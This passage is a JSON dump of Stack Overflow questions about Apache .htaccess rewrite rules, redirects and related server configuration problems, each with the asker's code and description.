[R,L]\n</code></pre>\n"},{"tags":["php","html",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13195590,"title":".htaccess - Redirect subfolder to index.php using subfolder name as variable","body":"<p>This is driving me mad. I'm trying to use .htaccess to redirect a subfolder (that doesn't exist) to the index page, using the subfolder name as the variable. ie:</p>\n\n<p><a href=\"http://www.website.com/john/\" rel=\"nofollow\">http://www.website.com/john/</a></p>\n\n<p>redirects to:</p>\n\n<p><a href=\"http://www.website.com/index.php?name=john\" rel=\"nofollow\">http://www.website.com/index.php?name=john</a></p>\n\n<p>I've tried this (and various others) with no luck:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteRule ^(.*)$ index.php?name=$1\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13195357,"title":"Mod Rewrite with multiple parameters","body":"<p>I'm trying to setup a rewrite rule so that any text in place of a subdomain will be parameter one and any text after the first forward slash will be parameter two but I'm struggling with regex and am unsure about rewrite terminology.</p>\n\n<p>For example, if someone requested:</p>\n\n<pre><code>joebloggs.mydomain.com\n</code></pre>\n\n<p>I would like them to see:</p>\n\n<pre><code>mydomain.com/index.php?site=joebloggs\n</code></pre>\n\n<p>Also, if someone requested:</p>\n\n<pre><code>joebloggs.mydomain.com/contact\n</code></pre>\n\n<p>I would like them to see:</p>\n\n<pre><code>mydomain.com/index.php?site=joebloggs&amp;page=contact\n</code></pre>\n\n<p>By \"see\" I mean see the page, rather than see the URL - it's a CMS-like project so you can probably see where I'm going with it. Also, I've worked out how to remove www. so that's not an issue :)</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13179319,"title":"how to redirect http://www.mydomain.com/test/ to http://mydomain.com/test/","body":"<p>This code did not work for me:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^www.mydomain.com [NC]\nRewriteRule ^(.*) http://mydomain.com/$1 [L,R=301]\n</code></pre>\n\n<p>I have tested a lot of things including <a href=\"http://stackoverflow.com/questions/234723/generic-htaccess-redirect-www-to-non-www\">Generic htaccess redirect www to non-www</a>, but it did not solved my problem.</p>\n\n<p>Can any body help me to solve this problem ?</p>\n"},{"tags":["apache",".htaccess","iis","web-config"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13195096,"title":"Translating .htaccess rewrite rules to Web.config","body":"<p>I've developed a PHP application on an Apache web server but now need to deploy it to IIS, which apparently doesn't work with .htaccess files.</p>\n\n<p>These are my rewrite rules:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^ index.php [QSA,L]\n</code></pre>\n\n<p>It's my understanding that I can just plonk a Web.config file into the root directory and IIS will pick it up, I've tried writing one but I get a 500 internal server error which I'm not able to look at because I don't have access to the server logs.</p>\n\n<pre><code>&lt;configuration&gt;\n    &lt;system.webServer&gt;\n        &lt;rewrite&gt;\n            &lt;rules&gt;\n                &lt;rule name=\"goddamnitIIS\" patternSyntax=\"Wildcard\"&gt;\n                    &lt;match url=\"*\" /&gt;\n                    &lt;conditions&gt;\n                        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" negate=\"true\" /&gt;\n                        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" negate=\"true\" /&gt;\n                    &lt;/conditions&gt;\n                    &lt;action type=\"Rewrite\" url=\"index.php\" /&gt;\n                &lt;/rule&gt;\n            &lt;/rules&gt;\n        &lt;/rewrite&gt;\n    &lt;/system.webServer&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>Could someone tell me where I'm going wrong? Thanks.</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13157048,"title":"My .htaccess pretty url not working which is in localhost (local machine with xampp)","body":"<p>I need to rewrite this url :\n   <code>http://localhost/blog/post.php?id=48</code> \ninto \n    <code>http://localhost/blog/post/48</code>\nwhich is in localhost of my xampp.\nI have created .htaccess file and wrote the below code to work.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^post/([0-9]+)/?$ post.php?id=$1 [NC,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I have tried redirection and all other stuff. Everything is working but my rewrite rule alone not working. I've searched and tried all options but i couldn't succeed. Plz anyone help me out on this!!</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":13194043,"title":".htaccess RewriteRule without URL change in browser","body":"<p>I have <code>.htaccess</code> file:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} ^somedomain.com [NC]\nRewriteRule ^(.*)$ http://www.somedomain.com/$1 [R=301,NC]\n\nRewriteRule ^r/(.*)$ index.php?rid=$1 [NC]\n</code></pre>\n\n<p>But last condition performs redirect in browser when I request URL like <code>www.somedomain.com/r/123</code> and show me URL like <code>www.somedomain.com/index.php?rid=123</code>. But I need call this script without URL change.</p>\n\n<p>What's wrong?</p>\n"},{"tags":["php",".htaccess","ini"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":22,"score":2,"question_id":13193884,"title":"How to set per-script upload_max_filesize limit?","body":"<p>I have the following issue:</p>\n\n<p>How to set per-script upload_max_filesize limit?\nI want to set a larger upload max filesize limit for a particular script (action). I know I could use .htaccess, but the problem is that all actions are being dispatched via single index.php file, which likely means for all actions .htaccess rules are the same. So is it possible to set a per-script max_upload_size for a single php script (action)?</p>\n\n<p>Hope, you will be able to help me.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13193156,"title":"RewriteRule htaccess and hidden php file for all","body":"<p>I have a problem in RewriteRule htaccess:\nexample:\nmy php file is main.php\nwe need to when user trying to <strong>www.mysite.com/hello</strong> , then show <strong>www.mysite.com/main.php</strong>\nfor this expamle we have below code in .htacces:</p>\n\n<pre><code># BEGIN Htaccess\nOptions +FollowSymLinks\nRewriteEngine On\nRewriteRule ^hello/*$ main.php\n</code></pre>\n\n<p>but in this code if user can open <strong>www.mysite.com/hello</strong> and <strong>www.mysite.com/main.php</strong></p>\n\n<p>I need if user trying <strong>www.mysite.com/main.php</strong> then show error <em>404</em> but if trying for <strong>www.mysite.com/hello</strong> view content of <strong>main.php</strong></p>\n\n<p>thank you;)</p>\n"},{"tags":[".htaccess","replace","rewrite","character"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13187367,"title":"Rewrite rule url character replace","body":"<p>How can i replace + to - in my url. What code shoud I add in my htacces to get rid of + and replace it with a minus.</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^search=([^&amp;]+)$\nRewriteRule ^ http://mysite.com\\/Download\\/free\\/%2.html? [R,L,NE]\n</code></pre>\n\n<p>If i type a search that contain spaces, every space become + and i want -.</p>\n"},{"tags":[".htaccess","mod-rewrite","sitemap","symlink","multiviews"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13188555,"title":"Stop htaccess from redirecting certain file types?","body":"<p>My htaccess works exactly as I want it to except it is also redirecting my sitemap files.  Does anyone know what can be changed or added to keep it from effect any .xml files but continue to work the same for anything else?</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^mysite.com$\nRewriteRule ^(.*)$ http://www.mysite.com/review/$1 [R=301,L]\n\nOptions -MultiViews +FollowSymlinks -Indexes\n\nRewriteEngine on\nRewriteRule ^([a-zA-Z0-9\\.\\-]+)$ review.php?site=$1 [L,QSA]\n</code></pre>\n\n<p>Basically write now it shows the contents of mysite.com/review/review.php?site=$1 when you go to mysite.com/review/$1 and I want it to continue to work like that, just not for .xml files.</p>\n\n<p>Basically if someone goes to mysite.com/review/sitemap.xml it should show the actual sitemap, not the contents of mysite.com/review/review.php?site=sitemap.xml</p>\n\n<p>Any help would be greatly appreciated.  Thanks!</p>\n"},{"tags":["iphone",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13192645,"title":"stop iphone site opening on PC","body":"<p>My iphone site is visible more on google search than original site. And it runs on PC as a iphone site, which is a bit distracting. I want to redirect to main site if it is not iphone device.</p>\n\n<p>I tried this htaccess code but it's not working for me:</p>\n\n<pre><code>RewriteCond %{HTTP_USER_AGENT} !^\"iPhone\" [NC]\nRewriteRule .? http://www.example.com%{REQUEST_URI} [R=301,L]\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13192077,"title":"403 premission to server access","body":"<p>I am programming, and suddenly i can't assec my website.</p>\n\n<p>The error:</p>\n\n<pre><code>Forbidden\n\nYou don't have permission to access / on this server.\n\nAdditionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.\n\nApache/2 Server at project.vanmarijn.nl Port 80\n</code></pre>\n\n<p>Am i blocked on my server???\nAnd i can't right now on the Direct Admin to look if i'm blocked or unblock myselff, so how can i unblock myself in that case???</p>\n\n<p>It happend when i was using and changing the .htaccess file</p>\n"},{"tags":["php",".htaccess","redirect","infinite-loop"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13191924,"title":"Redirect loop (only on online server but not on localhost)","body":"<p>I made a site in php, sql, html and CSS. When I ran this site on my localhost everything worked perfectly fine. But when I uploaded it (and automatically added a .htaccess file) to an online server, it gave me a redirection loop error. \nThe redirection structure of my page is the following:</p>\n\n<p><strong>index.php:</strong></p>\n\n<p>-form one with \"button\" tags (not input type: button) --> post method: page1.php</p>\n\n<p>-form two with \"button\" tags (not input type: button) --> post method: page2.php</p>\n\n<p>-form three with \"button\" tags (not input type: button) --> post method: page3.php</p>\n\n<p><strong>page1.php:</strong></p>\n\n<p>-php/sql processing (inserting variables in database, calculating them, ...)</p>\n\n<p>-header(location: index.php)(that is automatically executed after the other php code)</p>\n\n<p><strong>page2.php:</strong></p>\n\n<p>-php/sql processing (inserting variables in database, calculating them, ...)</p>\n\n<p>-header(location: index.php)(that is automatically executed after the other php code)</p>\n\n<p><strong>page3.php:</strong></p>\n\n<p>-instant run of a header(location: index.php);</p>\n\n<p>to reload the page</p>\n\n<p>All help is appreciated,</p>\n\n<p>Bibbox3</p>\n"},{"tags":["php",".htaccess","web-applications"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13176042,"title":"Server is redirecting the request for this address in a way that will never complete, but successul using WAMP","body":"<p>When I try to open my login page, it shows an error like '\" the server is redirecting the request for this address in a way that will never complete\" ...I think the issue might be with .htaccess</p>\n\n<p>Below is the .htaccess:</p>\n\n<p>Turn on URL rewriting</p>\n\n<pre><code>RewriteEngine On\nInstallation directory\nRewriteBase\n\n// Allow any files or directories that exist to be displayed directly\n\n\nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteCond %{REQUEST_FILENAME} !-d\n\n// Rewrite all other URLs to index.php/URL\n\n\nRewriteRule .*/ index.php/$0 [PT,L] \"\n</code></pre>\n\n<p>Am not that sound in coding stuffs..could anybody help me with it..btw i have successfully test this project on my system using wamp server..but when am trying it on webserver getting redirect loop error!!...its an open source project for blood donor database please help me with it?.. am giving a link for all the related files for downloading...please download and check whats wrong with it..thanks in advance ....</p>\n\n<p>link:   <a href=\"http://www.uploadmb.com/dw.php?id=1351767344\" rel=\"nofollow\">http://www.uploadmb.com/dw.php?id=1351767344</a></p>\n"},{"tags":["apache",".htaccess","wildcard"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13185114,"title":"Disable access to subdirectories with wildcard","body":"<p>I have this directory structure:</p>\n\n<pre><code>photos/\n  photos/2012_01\n    photos/2012_01/thumbnails\n    photos/2012_01/large\n  photos/2012_02/\n    photos/2012_02/thumbnails\n    photos/2012_02/large\n  photos/2012_03/\n    etc...\n</code></pre>\n\n<p>Is it possible to disable access (Deny From All) for all files in <code>photos/*/large</code> with single .htaccess file placed in <code>photos/.htaccess</code>? Or do I have to put an .htaccess to each <code>photos/*/large</code> directory?</p>\n\n<p>Thanks, Martin.</p>\n"},{"tags":["php",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13190430,"title":"using .htaccess to get rid of trailing slash is causing my url to change","body":"<p>here is my .htaccess code.</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteCond %{REQUEST_URI} !/$\nRewriteRule (.*) $1\\.php [L]\nRewriteRule ^([a-zA-Z0-9_-]+)$ profile.php?u=$1\nRewriteRule ^([a-zA-Z0-9_-]+)/$ profile.php?u=$1\nRewriteCond %{HTTP_HOST} ^www\\.pearlsquirrel\\.com$ [NC]\nRewriteRule ^(.*)$ http://pearlsquirrel.com/$1 [L,R=301]\n</code></pre>\n\n<p>What I want to happen is whenever there is a trailing slash in the url for it to disappear.  Instead, when I type in a url like this: <a href=\"http://pearlsquirrel.com/blues_music/\" rel=\"nofollow\">http://pearlsquirrel.com/blues_music/</a> it redirects me to this url: <a href=\"http://pearlsquirrel.com/profile.php?u=blues_music\" rel=\"nofollow\">http://pearlsquirrel.com/profile.php?u=blues_music</a>.  How do I make it so that when I type in the initial url, I simply get <a href=\"http://pearlsquirrel.com/blues_music\" rel=\"nofollow\">http://pearlsquirrel.com/blues_music</a> as a url.  Thank you very much for the help.  I have been working for a while on this problem with no luck.</p>\n"},{"tags":["php",".htaccess","seo"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":4,"view_count":28,"score":-1,"question_id":13189160,"title":"SEO Friendly .URL with htaccess URL","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/975498/using-apaches-mod-rewrite-to-parse-seo-friendly-urls\">using apache’s mod_rewrite to parse SEO friendly URL’s</a>  </p>\n</blockquote>\n\n\n\n<p>I've Google all I could. And tried various example online about .htaccess.  (my site is made with OScommerce and Php with mysql, apache)</p>\n\n<p>my current site is www.manisports.com.au  (see my site since to understand further)</p>\n\n<p>I would like to my URL SEO friendly.</p>\n\n<p>I would like it to be something like</p>\n\n<p><a href=\"http://manisports.com.au/bag-mitts.php?cPath=1\" rel=\"nofollow\">http://manisports.com.au/bag-mitts.php?cPath=1</a></p>\n\n<p>and my product info page is currently </p>\n\n<p>For porduct info page I would like it to be something like</p>\n\n<p><a href=\"http://manisports.com.au/Ladies-bag-Mitt?id=73\" rel=\"nofollow\">http://manisports.com.au/Ladies-bag-Mitt?id=73</a></p>\n\n<p>my current .htaccess reads as..</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^manisports\\.com$ [OR]\nRewriteCond %{HTTP_HOST} ^www\\.manisports\\.com$\nRewriteRule ^/?$ \"http\\:\\/\\/manisports\\.com\\.au\" [R=301,L]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":13188214,"title":"Htaccess with subdomain and zend modules","body":"<p>I have a Zend Framework application setup using modules. E.G. I have a \"stock\" module and a \"transaction\" module. I want to have multiple subdomains for these i.e. stock.website.com, transaction.website.com (so the DocumentRoot will be the same directory for each). The issue is, as they are Zend application 'modules' I would have to go stock.website.com/stock, or transaction.website.com/transaction.</p>\n\n<p>I'm wondering if there's a way to use a rewriteCond rule to identify the subdomain, and then treat all URLs loaded on that page as though they are from stock.website.com/stock, but only having stock.website.com in the adress bar?</p>\n\n<p>At the moment, I have the standard htaccess rules for a zend application.</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\n</code></pre>\n"},{"tags":[".htaccess","redirect","browser","obsolete"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":325,"score":0,"question_id":9916486,"title":"Using .htaccess to redirect obsolete browsers","body":"<p>Im trying to redirect few browsers using htaccess to a page that would suggest to update their browser and I cant figure it out with the .htaccess file:</p>\n\n<p>Currently I am using:</p>\n\n<pre><code>RewriteCond %{HTTP_USER_AGENT} \"MSIE 6\"\nRewriteCond %{REQUEST_URI} !^/ie/\n</code></pre>\n\n<p>but that transfers only internet explorer 6. How can I add more browsers and where can I find their user_agent names? I found this article online: <a href=\"http://evansims.com/6032/using-htaccess-to-redirect-obsolete-browsers/\" rel=\"nofollow\">http://evansims.com/6032/using-htaccess-to-redirect-obsolete-browsers/</a> which suggests this:</p>\n\n<pre><code>RewriteCond %{HTTP_USER_AGENT} \"Opera/3\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"Opera/2\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"Opera/1\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"Safari/4\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"Safari/3\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"Safari/2\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"Safari/1\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"Navigator/\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"MSIE 6\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"MSIE 5\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"MSIE 4\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"MSIE 3\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"MSIE 2\" [or]\nRewriteCond %{HTTP_USER_AGENT} \"MSIE 1\"\nRewriteRule . upgrade.html [L]\n</code></pre>\n\n<p>but it doesn't seem to work for me. Is there any website that provides a list with the http user agents in bulk? For example when I say Firefox 3.0 it means all versions including 3.6</p>\n\n<p>This website: <a href=\"http://www.useragentstring.com/pages/Firefox/\" rel=\"nofollow\">http://www.useragentstring.com/pages/Firefox/</a> has hundreds of user agents which Im pretty sure there is a way to include all of them in one row? ( Like IE6,7 Firefox 1 to 3 (including 3.6), Opera 1 to 10 etc )</p>\n"},{"tags":[".htaccess","restful-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13184542,"title":"Htaccess and restfull app","body":"<p>I'm not very good at htaccess, so looking for some help here. I have a web app running at</p>\n\n<pre><code>myserver.com/index.html\n</code></pre>\n\n<p>And I'm sending the requests (<code>GET,PUT,DELETE</code>) to a controller:</p>\n\n<pre><code>myserver.com/controller.php?id=5\n</code></pre>\n\n<p>Is there a way that I can use htaccess to submit through a url like </p>\n\n<pre><code>myserver.com/controller/5\n</code></pre>\n\n<p>I've toyed with my <code>htaccess</code> but just manage to create 500 errors when trying to hit the <code>index.html</code> page...</p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13186615,"title":"Apache .htacces redirect issue","body":"<p>Normally I access a page like this: <code>http://localhost/codeigniter/index.php/auth/login</code>\nHowever I want to be able to access to the page like this : <code>http://localhost/codeigniter/auth/login</code></p>\n\n<p>I have no information about <code>http.conf</code> and <code>.htaccess</code> configurations.</p>\n\n<p>my http.conf file is at its default except uncommentnig \"<code>LoadModule rewrite_module modules/mod_rewrite.so</code>\"</p>\n\n<p>I inspected many proposed .htaccess files but I could not understan the logic behind the rewriting rules.</p>\n\n<p>Here is the most successful <code>.htaccess</code> content for me. (by the most successful I mean that this is the only one that gives 404 error created by the CodeIgniter not by the server.)</p>\n\n<pre><code>    RewriteOptions Inherit\nOptions -Indexes\nOptions +FollowSymLinks\nRewriteBase /CodeIgniter/\n# Set the default file for indexes\nDirectoryIndex index.php\n\n&lt;IfModule mod_rewrite.c&gt;\n\n    # activate URL rewriting\n    RewriteEngine on\n\n    # do not rewrite links to the documentation, assets and public files\n    RewriteCond $1 !^(images|assets|uploads|captcha)\n\n    # do not rewrite for php files in the document root, robots.txt or the maintenance page\n    RewriteCond $1 !^([^\\..]+\\.php|robots\\.txt)\n\n    # but rewrite everything else\n    RewriteRule ^(.*)$ index.php/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n\n    ErrorDocument 404 index.php\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I hate requesting direct solutions however unfortunately, it is my last resort :/\nCan you give me a right solution to my problem?</p>\n"},{"tags":[".htaccess","seo","friendly-url","prestashop"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":124,"score":0,"question_id":12728471,"title":"Url duplication with Prestashop SEO","body":"<p>I have an e-commerce developed with the CMS Prestashop.</p>\n\n<p>Yesterday i have seen in my Webmaster Tools that i had some duplicated URL, like this:</p>\n\n<pre><code>www.mysite.com/manufacturers\nwww.mysite.com/it/manufacturers.\n</code></pre>\n\n<p>Where 'it' is the suffix of the default and only language for the website.</p>\n\n<p>I've already activate the friendly URL in the back-office and also I've a .htaccess file generated automatically by the generator in the back-office.</p>\n\n<p>What should I do to fix this issue?</p>\n\n<p>PS: Also I think that I've already taken a penalization from googlebot.</p>\n"},{"tags":["apache",".htaccess","htpasswd"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13166461,"title":"Missing 'WWW-Authenticate' header for 401","body":"<p>I have a project which is protected by std AuthUserFile-directive in .htaccess.</p>\n\n<p>Everything is quite simple and has already been fine on another server. Here is the content of my <code>.htaccess</code>:</p>\n\n<p>The <code>.htaccess</code>:</p>\n\n<pre><code>AuthName \"Adminbereich\"\nAuthType Basic\nAuthUserFile /srv/www/passwords/.htpasswd-office\n\n&lt;Files *.php&gt;\nrequire valid-user\n&lt;/Files&gt;\n</code></pre>\n\n<p>The <code>.htpasswd-office</code> gets accessed. If I call <code>http://user:pass@host/</code> I get in. If I just call <code>http://host/</code> I get this message immediately ...</p>\n\n<pre><code>Authorization Required\n\nThis server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn't understand how to supply the credentials required.\n</code></pre>\n\n<p>... without any login-box showing. What could be the cause of this?</p>\n\n<p>This is a example-header from here: <code>http://www.pagetutor.com/keeper/mystash/secretstuff.html</code></p>\n\n<pre><code>HTTP/1.1 401 Authorization Required\nDate: Thu, 01 Nov 2012 21:38:27 GMT\nServer: Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/0.9.8e-fips-rhel5 mod_bwlimited/1.4\nWWW-Authenticate: Basic realm=\"My Secret Area\"\nAccept-Ranges: bytes\nContent-Length: 343\nContent-Type: text/html\n</code></pre>\n\n<p>And this is my header:</p>\n\n<pre><code>HTTP/1.1 401 Authorization Required\nDate: Thu, 01 Nov 2012 21:36:41 GMT\nServer: Apache/2.2.20 (Ubuntu)\nVary: Accept-Encoding\nContent-Type: text/html; charset=iso-8859-1\n</code></pre>\n\n<p>The magic <code>WWW-Authenticate: Basic realm=\"...\"</code> is missing and I have no idea why...</p>\n\n<p>I use the standard ubuntu (11.10) apache (2.2.20) without any modifications...</p>\n"},{"tags":[".htaccess","redirect","geolocation"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13178532,"title":"htaccess - conditional rules for language redirection (using mod_geoip)","body":"<p>I need to add a rule to the .htaccess that if the user attempts to access a page for another region, they'll be redirected to their correct region.</p>\n\n<p>For a UK user attempting to hit www.example.com/jp/product<br>\nIs redirected to: www.example.com/uk/product/<br>\n(And vice versa)</p>\n\n<p>I have many different languages, so I'm looking for a conditional rule if they're hitting a different language site than what they should be.</p>\n\n<p>Currently this works with the base site only:<br/></p>\n\n<p>[User attempts to visit] > [Redirected to:]<br>\nwww.example.com > www.example.com/uk/<br/>\nwww.example.com/product/ > www.example.com/uk/product/</p>\n\n<p>Here's the code so far:<br>\n<code>#Turn on GeoIP mod and path to geoip database, then turn rewrite on<br>\nGeoIPEnable On<br>\nRewriteEngine on<br>\nOptions +FollowSymlinks<br>\nRewriteBase /<br></code>\n<code>#If no cookie \"located\" with value \"true\" is found<br>\nRewriteCond %{HTTP_COOKIE} !located=true [NC]</code>\n<code>#Get country code, if UK redirect all requests to /uk/</code><br>\n<code>#except if the request is for /uk/, /css/, /js/, or /images/<br>\nRewriteCond %{ENV:GEOIP_COUNTRY_CODE} ^GB$<br>\nRewriteCond %{REQUEST_URI} !^(/uk/|/css/|/js/|/images/)<br>\nRewriteRule ^(.*)$ <a href=\"https://www.example.com/uk/\" rel=\"nofollow\">https://www.example.com/uk/</a>$1 [NC,R=301,L]<br>\nRewriteCond %{HTTP_COOKIE} !located=true [NC]<br>\nRewriteCond %{ENV:GEOIP_COUNTRY_CODE} ^JP$<br>\nRewriteCond %{REQUEST_URI} !^(/jp/|/css/|/js/|/images/)<br>\nRewriteRule ^(.*)$ <a href=\"https://www.example.com/jp/\" rel=\"nofollow\">https://www.example.com/jp/</a>$1 [NC,R=301,L]<br>\n</code></p>\n\n<p>So what can I do in order to remove the language directory from the URI path?</p>\n"},{"tags":["ajax",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":19,"score":3,"question_id":13182305,"title":"Use AJAX with .htaccess redirected subdomain","body":"<p>i am doing subdomain redirection with;</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^([^\\.]+)\\.domain\\.com$ [NC]\n\nRewriteCond %1 !^(www|ftp|mail)$ [NC]\n\nRewriteRule ^.*$ file.php?id=%1 [L]\n</code></pre>\n\n<p>This turns <strong>someid.domain.com</strong> to <strong>www.domain.com/file.php?id=someid</strong></p>\n\n<p>Everything is ok for now but i am having problem to use AJAX on the page which is posting variables to a file with </p>\n\n<pre><code>$.post('post.php', {ID: ID},\n</code></pre>\n\n<p>As you know AJAX wont let to use like <strong>www.domain.com/post.php</strong> but when i write <strong>post.php</strong> bec. of redirection it searches for <strong>someid.domain.com/post.php</strong></p>\n\n<p>This is what i want;</p>\n\n<p>1- Redirect <strong>someid.domain.com</strong> to <strong>www.domain.com/file.php?id=someid</strong></p>\n\n<p>2- Redirect <strong>someid.domain.com/post.php</strong> to <strong>www.domain.com/post.php</strong></p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":21,"score":2,"question_id":13184241,"title":".htaccess perform redirect to a new domain","body":"<p>I have been working on a new site, and I need to use .htaccess to catch our maintence page and send it to our current website:</p>\n\n<p>For example: mywebsite.net/shop_closed.html should redirect to www.mysite.com</p>\n\n<p>I've tried using this:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^website.hostname.net [NC]\nRewriteRule ^(.*)$ http://www.oldsite.com/$1 [R=301,L]\n</code></pre>\n\n<p>and this catches everything. I'm just now learning about .htaccess today, and I'm not sure if I'm even in the ballpark with what I've been doing.</p>\n\n<p>Any help would be greatly appreciated. </p>\n"},{"tags":[".htaccess","directory","root","subfolder"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4,"score":0,"question_id":13183348,"title":"Move root directory to subfolder with the same URL structure","body":"<p>Currently I have a static site with good SEO standing, but I would like to move it to a wordpress based site with losing my URL. My thought is to build a wordpress under a folder, and use .htaccess to point all traffic to that folder without losing the structure. For example, mydomain.com/Folder1/old.html  to  mydomain.com/NewFolder/Folder1/old.html.  Can this be done?? and how to do the .htaccess?</p>\n"},{"tags":[".htaccess","cakephp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13182742,"title":"htaccess rewrite shows error 324","body":"<p>I'm trying to rewrite <code>*.staging.domain.com</code> to <code>builder.staging.domain.com/contest/*</code></p>\n\n<p>I'm using CakePHP as my framework. Here are my rewrite rules in the webroot folder:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php [QSA]\nRewriteCond %{HTTP_HOST} !builder\\. [NC]\nRewriteCond %{HTTP_HOST} ^([a-z0-9-_]+)\\.(.*) [NC]\nRewriteRule ^(.*)$ http://builder.%2/cont/%1 [P,L]\n</code></pre>\n\n<p>I can tell my rewrite rules work because it does redirect me but after a few more refreshes, I receive an <strong>Error 324 No Data Received</strong>. I've been researching for 2 days and trying everything. I tried just redirecting to google instead and it still happens. Can anyone point me in the right direction? Is this a server error or an htaccess error? We just recently installed the wildcard. I was wondering if it's somehow doing an infinite loop or 